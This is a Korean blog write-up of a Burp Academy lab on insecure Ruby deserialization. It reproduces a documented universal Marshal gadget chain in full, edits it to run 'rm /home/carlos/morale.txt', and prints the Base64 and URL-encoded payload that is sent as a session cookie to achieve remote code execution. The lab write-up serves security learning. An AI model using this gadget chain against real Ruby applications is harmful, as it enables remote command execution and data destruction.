---
layout: post
title: "Burp Academy-안전하지 않은 역직렬화(Insecure Deserialization) 관련 취약점: Exploiting Ruby deserialization using a documented gadget chain"
categories: [보안취약점, Burp Academy]
tags: [보안취약점, Burp Academy, Insecure Deserialization]
toc: true
last_modified_at: 2024-07-12 21:00:00 +0900
---


# 개요
- 안전하지 않은 역직렬화(Insecure Deserialization) 취약점 문제이다. 
- 문제 주소: https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-exploiting-ruby-deserialization-using-a-documented-gadget-chain
- 취약점 설명페이지: https://portswigger.net/web-security/deserialization/exploiting
- 난이도: PRACTITIONER (보통)


# 취약점 개요 (Working with documented gadget chains)
- 비록 개짓 체인을 이용한 페이로드를 만들어주는 전용툴이 존재하지 않더라도 exploit을 설명하는 온라인 문서가 있다면, 적혀있는 내용을 바탕으로 코드를 작성해 페이로드를 생성할 수 있다. 완전히 제로에서부터 시작해서 페이로드를 만드는 것 보다는 훨씬 쉽다. 


# 문제 개요
- 이 랩은 직렬화 베이스의 세션 관리 메커니즘을 사용하고 있다. 
- 또한 루비 온 레일즈 프레임워크를 사용하고 있다. 
- 개짓체인을 통해 RCE를 실행할 수 있는 문서화된 exploit이 존재한다. 
- 랩을 풀려면 문서화된 exploit을 찾고, 그 것을 사용해 RCE 페이로드를 포함하는 악의적인 직렬화 오브젝트를 만든다. 
- 그러고 나서 오브젝트를 웹 사이트에 전달하여 calros 유저의 홈디렉토리에 있는 morale.txt를 삭제하면 된다. 
- wiener:peter 크레덴셜로 로그인할 수 있다. 

```
This lab uses a serialization-based session mechanism and the Ruby on Rails framework. There are documented exploits that enable remote code execution via a gadget chain in this framework.

To solve the lab, find a documented exploit and adapt it to create a malicious serialized object containing a remote code execution payload. Then, pass this object into the website to delete the morale.txt file from Carlos's home directory.

You can log in to your own account using the following credentials: wiener:peter
```

# 도전 
너무 완벽하게 하려고 하는게 안 좋을 수도 있다. 그냥 그런가보다 하고 일단 넘어가는게 좋을 때도 있다. 지금이 그렇다 .

일단 정답을 보면서라도 풀어보자. 
## 로그인한 후 확인
로그인해서 세션 쿠키를 확인해보면 루비베이스인 것을 알 수 있다. 

## 페이로드 생성 
"Universal Deserialisation Gadget for Ruby 2.x-3.x" 로 검색해보면 웹 문서를 찾을 수 있다. 

https://devcraft.io/2021/01/07/universal-deserialisation-gadget-for-ruby-2-x-3-x.html 의 스크립트는 다음과 같다. 

```rb
# Autoload the required classes
Gem::SpecFetcher
Gem::Installer

# prevent the payload from running when we Marshal.dump it
module Gem
  class Requirement
    def marshal_dump
      [@requirements]
    end
  end
end

wa1 = Net::WriteAdapter.new(Kernel, :system)

rs = Gem::RequestSet.allocate
rs.instance_variable_set('@sets', wa1)
rs.instance_variable_set('@git_set', "id")

wa2 = Net::WriteAdapter.new(rs, :resolve)

i = Gem::Package::TarReader::Entry.allocate
i.instance_variable_set('@read', 0)
i.instance_variable_set('@header', "aaa")


n = Net::BufferedIO.allocate
n.instance_variable_set('@io', i)
n.instance_variable_set('@debug_output', wa2)

t = Gem::Package::TarReader.allocate
t.instance_variable_set('@io', n)

r = Gem::Requirement.allocate
r.instance_variable_set('@requirements', t)

payload = Marshal.dump([Gem::SpecFetcher, Gem::Installer, r])
puts payload.inspect
puts Marshal.load(payload)
```

- id를 실행하고자 하는 커맨드인 `rm /home/carlos/morale.txt`로 변경한다. 
- 마지막 두개의 라인을 `puts Base64.encode64(payload)`로 변경한다. 
- base64 모듈을 사용할 수 있도록 `require "base64"`를 추가해준다. 

다음과 같다. 

```rb
require "base64"
# Autoload the required classes
Gem::SpecFetcher
Gem::Installer

# prevent the payload from running when we Marshal.dump it
module Gem
  class Requirement
    def marshal_dump
      [@requirements]
    end
  end
end

wa1 = Net::WriteAdapter.new(Kernel, :system)

rs = Gem::RequestSet.allocate
rs.instance_variable_set('@sets', wa1)
rs.instance_variable_set('@git_set', "rm /home/carlos/morale.txt")

wa2 = Net::WriteAdapter.new(rs, :resolve)

i = Gem::Package::TarReader::Entry.allocate
i.instance_variable_set('@read', 0)
i.instance_variable_set('@header', "aaa")


n = Net::BufferedIO.allocate
n.instance_variable_set('@io', i)
n.instance_variable_set('@debug_output', wa2)

t = Gem::Package::TarReader.allocate
t.instance_variable_set('@io', n)

r = Gem::Requirement.allocate
r.instance_variable_set('@requirements', t)

payload = Marshal.dump([Gem::SpecFetcher, Gem::Installer, r])
# puts payload
puts Base64.encode64(payload)
```

위의 코드를 [onlinegdb.com](https://www.onlinegdb.com/online_ruby_compiler) 에서 실행시켜본다.  

결과 값을 Base64인코딩해서 페이로드를 완성한다. 

완성된 값은 다음과 같다. 

```
BAhbCGMVR2VtOjpTcGVjRmV0Y2hlcmMTR2VtOjpJbnN0YWxsZXJVOhVHZW06
OlJlcXVpcmVtZW50WwZvOhxHZW06OlBhY2thZ2U6OlRhclJlYWRlcgY6CEBp
b286FE5ldDo6QnVmZmVyZWRJTwc7B286I0dlbTo6UGFja2FnZTo6VGFyUmVh
ZGVyOjpFbnRyeQc6CkByZWFkaQA6DEBoZWFkZXJJIghhYWEGOgZFVDoSQGRl
YnVnX291dHB1dG86Fk5ldDo6V3JpdGVBZGFwdGVyBzoMQHNvY2tldG86FEdl
bTo6UmVxdWVzdFNldAc6CkBzZXRzbzsOBzsPbQtLZXJuZWw6D0BtZXRob2Rf
aWQ6C3N5c3RlbToNQGdpdF9zZXRJIh9ybSAvaG9tZS9jYXJsb3MvbW9yYWxl
LnR4dAY7DFQ7EjoMcmVzb2x2ZQ==
```

![](/images/burp-academy-serial-7-1.png)

이 페이로드에는 개행문자가 들어가 있으므로 개행문자를 없앨 필요가 있다. 다음과 같이 한다. 

```sh
echo "BAhbCGMVR2VtOjpTcGVjRmV0Y2hlcmMTR2VtOjpJbnN0YWxsZXJVOhVHZW06
OlJlcXVpcmVtZW50WwZvOhxHZW06OlBhY2thZ2U6OlRhclJlYWRlcgY6CEBp
b286FE5ldDo6QnVmZmVyZWRJTwc7B286I0dlbTo6UGFja2FnZTo6VGFyUmVh
ZGVyOjpFbnRyeQc6CkByZWFkaQA6DEBoZWFkZXJJIghhYWEGOgZFVDoSQGRl
YnVnX291dHB1dG86Fk5ldDo6V3JpdGVBZGFwdGVyBzoMQHNvY2tldG86FEdl
bTo6UmVxdWVzdFNldAc6CkBzZXRzbzsOBzsPbQtLZXJuZWw6D0BtZXRob2Rf
aWQ6C3N5c3RlbToNQGdpdF9zZXRJIh9ybSAvaG9tZS9jYXJsb3MvbW9yYWxl
LnR4dAY7DFQ7EjoMcmVzb2x2ZQ==" | tr -d "\n\r"
```

위 명령으로 얻어낸 페이로드는 다음과 같다.

```
BAhbCGMVR2VtOjpTcGVjRmV0Y2hlcmMTR2VtOjpJbnN0YWxsZXJVOhVHZW06OlJlcXVpcmVtZW50WwZvOhxHZW06OlBhY2thZ2U6OlRhclJlYWRlcgY6CEBpb286FE5ldDo6QnVmZmVyZWRJTwc7B286I0dlbTo6UGFja2FnZTo6VGFyUmVhZGVyOjpFbnRyeQc6CkByZWFkaQA6DEBoZWFkZXJJIghhYWEGOgZFVDoSQGRlYnVnX291dHB1dG86Fk5ldDo6V3JpdGVBZGFwdGVyBzoMQHNvY2tldG86FEdlbTo6UmVxdWVzdFNldAc6CkBzZXRzbzsOBzsPbQtLZXJuZWw6D0BtZXRob2RfaWQ6C3N5c3RlbToNQGdpdF9zZXRJIh9ybSAvaG9tZS9jYXJsb3MvbW9yYWxlLnR4dAY7DFQ7EjoMcmVzb2x2ZQ==
```

그리고 이 것을 웹에서 전송해야 하므로 Burp Decoder를 사용해서 URL인코딩한다. 다음과 같다. 

```
%42%41%68%62%43%47%4d%56%52%32%56%74%4f%6a%70%54%63%47%56%6a%52%6d%56%30%59%32%68%6c%63%6d%4d%54%52%32%56%74%4f%6a%70%4a%62%6e%4e%30%59%57%78%73%5a%58%4a%56%4f%68%56%48%5a%57%30%36%4f%6c%4a%6c%63%58%56%70%63%6d%56%74%5a%57%35%30%57%77%5a%76%4f%68%78%48%5a%57%30%36%4f%6c%42%68%59%32%74%68%5a%32%55%36%4f%6c%52%68%63%6c%4a%6c%59%57%52%6c%63%67%59%36%43%45%42%70%62%32%38%36%46%45%35%6c%64%44%6f%36%51%6e%56%6d%5a%6d%56%79%5a%57%52%4a%54%77%63%37%42%32%38%36%49%30%64%6c%62%54%6f%36%55%47%46%6a%61%32%46%6e%5a%54%6f%36%56%47%46%79%55%6d%56%68%5a%47%56%79%4f%6a%70%46%62%6e%52%79%65%51%63%36%43%6b%42%79%5a%57%46%6b%61%51%41%36%44%45%42%6f%5a%57%46%6b%5a%58%4a%4a%49%67%68%68%59%57%45%47%4f%67%5a%46%56%44%6f%53%51%47%52%6c%59%6e%56%6e%58%32%39%31%64%48%42%31%64%47%38%36%46%6b%35%6c%64%44%6f%36%56%33%4a%70%64%47%56%42%5a%47%46%77%64%47%56%79%42%7a%6f%4d%51%48%4e%76%59%32%74%6c%64%47%38%36%46%45%64%6c%62%54%6f%36%55%6d%56%78%64%57%56%7a%64%46%4e%6c%64%41%63%36%43%6b%42%7a%5a%58%52%7a%62%7a%73%4f%42%7a%73%50%62%51%74%4c%5a%58%4a%75%5a%57%77%36%44%30%42%74%5a%58%52%6f%62%32%52%66%61%57%51%36%43%33%4e%35%63%33%52%6c%62%54%6f%4e%51%47%64%70%64%46%39%7a%5a%58%52%4a%49%68%39%79%62%53%41%76%61%47%39%74%5a%53%39%6a%59%58%4a%73%62%33%4d%76%62%57%39%79%59%57%78%6c%4c%6e%52%34%64%41%59%37%44%46%51%37%45%6a%6f%4d%63%6d%56%7a%62%32%78%32%5a%51%3d%3d
```

이 값을 세션쿠키에 설정해서 보내본다. 그러면 500응답과 함께 에러 스택 트레이스같은 것이 돌아온다. 

![](/images/burp-academy-serial-7-2.png)

그리고 문제가 풀렸다는 메세지가 출력된다. 

![](/images/burp-academy-serial-7-success.png)


## 페이로드를 전송 


# 참고 URL
- (2018년 11월) Ruby 2.x Universal RCE Deserialization Gadget Chain: https://www.elttam.com/blog/ruby-deserialization/#content <-- 여기를 읽고 있다.
- (2022년 4월) Universal Deserialisation Gadget for Ruby 2.x-3.x: https://devcraft.io/2021/01/07/universal-deserialisation-gadget-for-ruby-2-x-3-x.html